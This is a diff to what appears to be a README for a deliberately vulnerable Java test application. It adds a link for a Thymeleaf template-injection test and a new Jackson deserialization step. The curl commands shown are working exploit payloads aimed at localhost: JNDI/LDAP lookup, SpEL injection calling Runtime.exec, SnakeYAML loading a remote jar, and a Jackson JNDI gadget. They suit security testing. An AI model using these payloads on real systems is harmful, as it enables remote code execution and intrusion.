@@ -30,7 +30,7 @@
    ```
    curl 127.0.0.1:8080/jndi/lookup -d 'url=ldap://127.0.0.1:1389/a'
    ```
-9. 测试thymeleaf模板注入
+9. 测试thymeleaf模板注入: https://github.com/veracode-research/spring-view-manipulation
    ```
    curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27%6F%70%65%6E%20%2F%53%79%73%74%65%6D%2F%41%70%70%6C%69%63%61%74%69%6F%6E%73%2F%43%61%6C%63%75%6C%61%74%6F%72%2E%61%70%70%27)%7D__::.xx'
    ```
@@ -43,6 +43,9 @@
    ```
    curl 127.0.0.1:8080/snakeyaml/parse -d 'yaml=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/payload.jar"]]]]'
    ```
-
+12. 测试jackson反序列化
+   ```
+   curl 127.0.0.1:8080/jackson/parse -d 'json=["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://127.0.0.1:1389/Exploit"}]'
+   ```
 
 
